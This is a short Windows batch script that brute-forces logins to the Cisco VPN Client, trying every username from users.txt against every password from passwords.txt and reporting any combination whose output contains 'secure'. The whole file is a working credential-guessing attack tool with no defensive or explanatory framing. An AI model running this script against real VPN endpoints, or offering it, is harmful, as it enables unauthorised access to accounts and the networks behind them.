@echo off
FOR /F %%A IN (users.txt) DO (
	FOR /F %%B IN (passwords.txt) DO (
		rem attempt to connect to vpn
		"%programfiles%\Cisco Systems\VPN Client\vpnclient" connect admin user %%A pwd %%B cliauth > output.tmp
		
		rem look for success response
		type output.tmp | findstr "secure" > NUL && echo [+] Successful login %%A/%%B found! && pause && 			goto end_script
		echo [*] Login %%A/%%B not successful.		
	)
)
:end_script